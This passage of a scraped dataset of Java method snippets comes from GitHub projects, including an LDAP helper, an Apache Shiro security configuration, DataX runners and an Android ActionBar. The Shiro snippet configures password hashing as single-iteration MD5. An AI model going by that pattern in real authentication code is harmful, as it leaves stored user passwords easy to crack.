"implements": null, "modifiers": ["public"]}}, {"id": 30533, "method_name": "getValueBytes", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] getValueBytes(){\n        return this.valueBytes;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30534, "method_name": "process", "class_name": "TagBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Tag<?>", "snippet": "    public Tag<?> process(){\n        switch (getDataType()){\n            case 1:\n                return new StringTag(this.name, null).createFromData(this.valueBytes);\n            case 2:\n                return new IntTag(this.name, -1).createFromData(this.valueBytes);\n            case 3:\n                return new FloatTag(this.name, -1).createFromData(this.valueBytes);\n            case 4:\n                return new DoubleTag(this.name, -1).createFromData(this.valueBytes);\n            case 5:\n                return new ShortTag(this.name, (short) -1).createFromData(this.valueBytes);\n            case 6:\n                return new LongTag(this.name, -1).createFromData(this.valueBytes);\n            case 7:\n                return new CharTag(this.name, ' ').createFromData(this.valueBytes);\n            case 8:\n                return new ByteTag(this.name, (byte) 0).createFromData(this.valueBytes);\n            case 9:\n                return new ListTag<>(this.name, null).createFromData(this.valueBytes);\n            case 10:\n                return new MapTag<>(this.name, null).createFromData(this.valueBytes);\n            case 11:\n                return new ObjectTag(this.name).createFromData(this.valueBytes);\n            default:\n                throw new RuntimeException(\"Error: That data type does not exist!\");\n        }\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/TagBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30535, "method_name": "reconnect", "class_name": "LdapConnection", "params": ["String", "String"], "throws": ["NamingException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void reconnect(String principle, String credentials) throws NamingException {\n        if(null == context){\n            env.put(Context.SECURITY_PRINCIPAL, principle);\n            env.put(Context.SECURITY_CREDENTIALS, credentials);\n            this.context = new InitialLdapContext(env, null);\n        }else{\n            this.context.addToEnvironment(Context.SECURITY_PRINCIPAL, principle);\n            this.context.addToEnvironment(Context.SECURITY_CREDENTIALS, credentials);\n            this.context.reconnect(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/ldap/LdapConnection.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30536, "method_name": "getContext", "class_name": "LdapConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LdapContext", "snippet": "    public LdapContext getContext() {\n        return context;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/ldap/LdapConnection.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30537, "method_name": "setContext", "class_name": "LdapConnection", "params": ["LdapContext"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContext(LdapContext context) {\n        this.context = context;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/ldap/LdapConnection.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30538, "method_name": "shiroFilter", "class_name": "ShiroConfig", "params": ["SecurityManager"], "throws": null, "modifiers": ["public"], "return_type": "ShiroFilterFactoryBean", "snippet": "    public ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager) {\n        System.out.println(\"ShiroFilterFactoryBean.shiroFilter() \u6267\u884c\u4e86\");\n\n        ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();\n\n        shiroFilterFactoryBean.setSecurityManager(securityManager);\n\n        //\u8fd9\u91cc\u8bbe\u7f6e\u4e86\u767b\u5f55\u63a5\u53e3  \u5982\u679c\u8bbf\u95ee\u4e86\u67d0\u4e2a\u63a5\u53e3\u6ca1\u6709\u767b\u5f55  \u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\uff08\u5982\u679c\u4e0d\u662f\u524d\u540e\u7aef\u5206\u79bb\u5c31\u8fd4\u56de\u9875\u9762\uff09\n        shiroFilterFactoryBean.setLoginUrl(\"/pub/need_login\");\n\n        //\u5982\u679c\u662f\u524d\u540e\u7aef\u5206\u79bb\u5219\u4e0d\u9700\u8981\u8fd9\u4e2a\n        //shiroFilterFactoryBean.setSuccessUrl();\n\n        //\u8fd9\u4e2a\u662f\u7528\u6237\u767b\u5f55\u4e86  \u4f46\u6ca1\u6709\u6743\u9650 \u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\n        shiroFilterFactoryBean.setUnauthorizedUrl(\"/pub/need_permission\");\n\n\n        Map<String, Filter> filtersMap = new LinkedHashMap<>();\n        filtersMap.put(\"roleOrFilter\",new CustomRolesOrAuthorizationFilter());\n        shiroFilterFactoryBean.setFilters(filtersMap);\n\n        //\u62e6\u622a\u5668\u8def\u5f84 \u57511\uff1a\u90e8\u5206\u8def\u5f84\u65e0\u6cd5\u62e6\u622a\uff0c\u62e6\u622a\u6548\u679c\u65f6\u6709\u65f6\u65e0\uff0c\u56e0\u4e3a\u4f7f\u7528\u4e86hashMap \u65e0\u5e8f\u7684\u5e94\u8be5\u4f7f\u7528linkedHashMap\n        Map<String, String> filterChainDefinitionMap = new LinkedHashMap<>();\n\n        //\u533f\u540d\u8bbf\u95ee  \u6e38\u5ba2\u8bbf\u95ee\u8def\u5f84\n        filterChainDefinitionMap.put(\"/pub/**\", \"anon\");\n\n        //\u9000\u51fa\u8fc7\u6ee4\u5668\n        filterChainDefinitionMap.put(\"/user/logout\", \"logout\");\n\n        //\u767b\u5f55\u7528\u6237\u624d\u80fd\u8bbf\u95ee\n        filterChainDefinitionMap.put(\"/authc/**\", \"authc\");\n\n        //\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\n        filterChainDefinitionMap.put(\"/admin/**\", \"roleOrFilter[admin,root]\");\n\n        //\u89c6\u9891\u4fee\u6539\u6743\u9650\n        filterChainDefinitionMap.put(\"/goods/video/update\", \"perms[video_update]\");\n\n        //\u57512\uff1a\u8fc7\u6ee4\u94fe\u662f\u987a\u5e8f\u6267\u884c\u7684\uff0c\u4ece\u4e0a\u800c\u4e0b\uff0c\u4e00\u822c\u6765\u8bb2/** \u662f\u653e\u5230\u6700\u4e0b\u9762\u7684\n\n        //authc : url \u5fc5\u987b\u901a\u8fc7\u8ba4\u8bc1\u624d\u80fd\u8bbf\u95ee\n        //anon : url\u53ef\u4ee5\u533f\u540d\u8bbf\u95ee\n        filterChainDefinitionMap.put(\"/**\", \"authc\");\n\n        shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);\n        return shiroFilterFactoryBean;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30539, "method_name": "securityManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SecurityManager", "snippet": "    public SecurityManager securityManager() {\n        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();\n        securityManager.setSessionManager(sessionManager());\n\n        //\u8bbe\u7f6e\u81ea\u5b9a\u4e49cacheManager\n        securityManager.setCacheManager(redisCacheManager());\n        securityManager.setRealm(customRealm());\n        return securityManager;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30540, "method_name": "customRealm", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CustomRealm", "snippet": "    public CustomRealm customRealm() {\n        //\u81ea\u5b9a\u4e49realm \u5b9e\u73b0AuthorizingRealm\n        CustomRealm customRealm = new CustomRealm();\n        //\u8bbe\u7f6e\u52a0\u5bc6\n        customRealm.setCredentialsMatcher(hashedCredentialsMatcher());\n        return customRealm;\n\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30541, "method_name": "sessionManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SessionManager", "snippet": "    public SessionManager sessionManager() {\n        //\u65b0\u5efa\u81ea\u5b9a\u4e49sessionManager \u5b9e\u73b0DefaultSessionManager\n        CustomSessionManager customSessionManager = new CustomSessionManager();\n\n        //\u8bbe\u7f6e\u81ea\u5b9a\u4e49session\u6301\u4e45\u5316\n        customSessionManager.setSessionDAO(redisSessionDAO());\n        //\u8bbe\u7f6esession\u8fc7\u671f\u65f6\u95f4  \u9ed8\u8ba430\u5206\u949f  \u5355\u4f4d\u662f\u6beb\u79d2\n        customSessionManager.setGlobalSessionTimeout(180000);\n        return customSessionManager;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30542, "method_name": "hashedCredentialsMatcher", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HashedCredentialsMatcher", "snippet": "    public HashedCredentialsMatcher hashedCredentialsMatcher(){\n        HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n        //\u8bbe\u7f6e\u6563\u5217\u7b97\u6cd5 \uff1a\u8fd9\u91cc\u8bbe\u7f6e\u7684MD5\n        credentialsMatcher.setHashAlgorithmName(\"MD5\");\n        //\u8bbe\u7f6e\u591a\u91cd\u52a0\u5bc6\u7b97\u6cd5 \uff1a\u8fd9\u91cc\u8bbe\u7f6e\u7684\u662f1\u6b21\u52a0\u5bc6(md5(xxx))\n        credentialsMatcher.setHashIterations(1);\n        return credentialsMatcher;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30543, "method_name": "getRedisManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RedisManager", "snippet": "    public RedisManager getRedisManager(){\n\n        RedisManager redisManager = new RedisManager();\n        redisManager.setPort(6379);\n        return redisManager;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30544, "method_name": "redisCacheManager", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RedisCacheManager", "snippet": "    public RedisCacheManager redisCacheManager(){\n        RedisCacheManager redisCacheManager = new RedisCacheManager();\n\n        //\u8bbe\u7f6e\u7f13\u5b58key\u8fc7\u671f\u65f6\u95f4\uff0c\u9ed8\u8ba4\u5355\u4f4d\u662fS\n        redisCacheManager.setExpire(20);\n        redisCacheManager.setRedisManager(getRedisManager());\n        return redisCacheManager;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30545, "method_name": "redisSessionDAO", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RedisSessionDAO", "snippet": "    public RedisSessionDAO redisSessionDAO(){\n        RedisSessionDAO redisSessionDAO = new RedisSessionDAO();\n        redisSessionDAO.setRedisManager(getRedisManager());\n        //\u8bbe\u7f6esessionid \u751f\u6210\u5668\n        redisSessionDAO.setSessionIdGenerator(new CustomSessionIdGenerator());\n        //\u8bbe\u7f6e\u6301\u4e45\u5316\u8d85\u65f6\u65f6\u95f4  \u9ed8\u8ba4\u548c\u4e0b\u9762\u8fd9\u53e5\u8bdd\u65f6\u95f4\u8bbe\u7f6e\u4e00\u6837   customSessionManager.setGlobalSessionTimeout(200000);\n        return redisSessionDAO;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30546, "method_name": "lifecycleBeanPostProcessor", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LifecycleBeanPostProcessor", "snippet": "    public LifecycleBeanPostProcessor lifecycleBeanPostProcessor() {\n        return new LifecycleBeanPostProcessor();\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30547, "method_name": "authorizationAttributeSourceAdvisor", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AuthorizationAttributeSourceAdvisor", "snippet": "    public AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor() {\n        AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor = new AuthorizationAttributeSourceAdvisor();\n        authorizationAttributeSourceAdvisor.setSecurityManager(securityManager());\n        return authorizationAttributeSourceAdvisor;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30548, "method_name": "getDefaultAdvisorAutoProxyCreator", "class_name": "ShiroConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DefaultAdvisorAutoProxyCreator", "snippet": "    public DefaultAdvisorAutoProxyCreator getDefaultAdvisorAutoProxyCreator(){\n        DefaultAdvisorAutoProxyCreator defaultAdvisorAutoProxyCreator=new DefaultAdvisorAutoProxyCreator();\n        defaultAdvisorAutoProxyCreator.setUsePrefix(true);\n        return defaultAdvisorAutoProxyCreator;\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/config/ShiroConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30549, "method_name": "handleError", "class_name": "CustomResponseErrorHandler", "params": ["ClientHttpResponse"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void handleError(ClientHttpResponse response) throws IOException {\n            log.error(\"Has error response: {}\", response);\n            super.handleError(response);\n        }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/infrastructure/ServerClientRest.java", "stars": "4", "class_props": {"extends": "DefaultResponseErrorHandler", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30550, "method_name": "hasError", "class_name": "CustomResponseErrorHandler", "params": ["ClientHttpResponse"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean hasError(ClientHttpResponse response) throws IOException {\n            log.error(\"Has error response: {}\", response);\n            return super.hasError(response);\n        }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/infrastructure/ServerClientRest.java", "stars": "4", "class_props": {"extends": "DefaultResponseErrorHandler", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30551, "method_name": "run", "class_name": "TaskGroupContainerRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        try {\n            Thread.currentThread().setName(\n                    String.format(\"taskGroup-%d\", this.taskGroupContainer.getTaskGroupId()));\n            this.taskGroupContainer.start();\n            this.state = State.SUCCEEDED;\n        } catch (Throwable e) {\n            this.state = State.FAILED;\n            throw DataXException.asDataXException(\n                    FrameworkErrorCode.RUNTIME_ERROR, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 30552, "method_name": "getTaskGroupContainer", "class_name": "TaskGroupContainerRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TaskGroupContainer", "snippet": "    public TaskGroupContainer getTaskGroupContainer() {\n        return taskGroupContainer;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 30553, "method_name": "getState", "class_name": "TaskGroupContainerRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "State", "snippet": "    public State getState() {\n        return state;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 30554, "method_name": "setState", "class_name": "TaskGroupContainerRunner", "params": ["State"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setState(State state) {\n        this.state = state;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 30555, "method_name": "setHomeAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHomeAction(Action action) {\n        mHomeBtn.setOnClickListener(this);\n        mHomeBtn.setTag(action);\n        mHomeBtn.setImageResource(action.getDrawable());\n        mHomeLayout.setVisibility(View.VISIBLE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30556, "method_name": "clearHomeAction", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearHomeAction() {\n        mHomeLayout.setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30557, "method_name": "setHomeLogo", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHomeLogo(int resId) {\n        // TODO: Add possibility to add an IntentAction as well.\n        mLogoView.setImageResource(resId);\n        mLogoView.setVisibility(View.VISIBLE);\n        mHomeLayout.setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30558, "method_name": "setDisplayHomeAsUpEnabled", "class_name": "ActionBar", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDisplayHomeAsUpEnabled(boolean show) {\n        mBackIndicator.setVisibility(show? View.VISIBLE : View.GONE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30559, "method_name": "setTitle", "class_name": "ActionBar", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(CharSequence title) {\n        mTitleView.setText(title);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30560, "method_name": "setTitle", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(int resid) {\n        mTitleView.setText(resid);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30561, "method_name": "setProgressBarVisibility", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProgressBarVisibility(int visibility) {\n        mProgress.setVisibility(visibility);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30562, "method_name": "getProgressBarVisibility", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProgressBarVisibility() {\n        return mProgress.getVisibility();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30563, "method_name": "setOnTitleClickListener", "class_name": "ActionBar", "params": ["OnClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnTitleClickListener(OnClickListener listener) {\n        mTitleView.setOnClickListener(listener);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30564, "method_name": "onClick", "class_name": "ActionBar", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View view) {\n        final Object tag = view.getTag();\n        if (tag instanceof Action) {\n            final Action action = (Action) tag;\n            action.performAction(view);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30565, "method_name": "addActions", "class_name": "ActionBar", "params": ["ActionList"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addActions(ActionList actionList) {\n        int actions = actionList.size();\n        for (int i = 0; i < actions; i++) {\n            addAction(actionList.get(i));\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30566, "method_name": "addAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAction(Action action) {\n        final int index = mActionsView.getChildCount();\n        addAction(action, index);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30567, "method_name": "addAction", "class_name": "ActionBar", "params": ["Action", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAction(Action action, int index) {\n        mActionsView.addView(inflateAction(action), index);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30568, "method_name": "removeAllActions", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeAllActions() {\n        mActionsView.removeAllViews();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30569, "method_name": "removeActionAt", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeActionAt(int index) {\n        mActionsView.removeViewAt(index);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30570, "method_name": "removeAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeAction(Action action) {\n        int childCount = mActionsView.getChildCount();\n        for (int i = 0; i < childCount; i++) {\n            View view = mActionsView.getChildAt(i);\n            if (view != null) {\n                final Object tag = view.getTag();\n                if (tag instanceof Action && tag.equals(action)) {\n                    mActionsView.removeView(view);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30571, "method_name": "getActionCount", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getActionCount() {\n        return mActionsView.getChildCount();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30572, "method_name": "inflateAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["private"], "return_type": "View", "snippet": "    private View inflateAction(Action action) {\n        View view = mInflater.inflate(R.layout.actionbar_item, mActionsView, false);\n\n        ImageButton labelView =\n            (ImageButton) view.findViewById(R.id.actionbar_item);\n        labelView.setImageResource(action.getDrawable());\n\n        view.setTag(action);\n        view.setOnClickListener(this);\n        return view;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 30573, "method_name": "getDrawable", "class_name": "AbstractAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getDrawable() {\n            return mDrawable;\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": null, "implements": ["Action"], "modifiers": ["public", "static", "abstract"]}}, {"id": 30574, "method_name": "performAction", "class_name": "IntentAction", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void performAction(View view) {\n            try {\n               mContext.startActivity(mIntent); \n            } catch (ActivityNotFoundException e) {\n                Toast.makeText(mContext,\n                        mContext.getText(R.string.actionbar_activity_not_found),\n                        Toast.LENGTH_SHORT).show();\n            }\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "AbstractAction", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30575, "method_name": "createClass", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createClass() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    TestClass testClass = defaultObjectFactory.create(TestClass.class,\n        Arrays.asList(String.class, Integer.class), Arrays.asList(\"foo\", 0));\n\n    Assertions.assertEquals((Integer) 0, testClass.myInteger, \"myInteger didn't match expected\");\n    Assertions.assertEquals(\"foo\", testClass.myString, \"myString didn't match expected\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30576, "method_name": "createClassThrowsProperErrorMsg", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createClassThrowsProperErrorMsg() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    try {\n      defaultObjectFactory.create(TestClass.class, 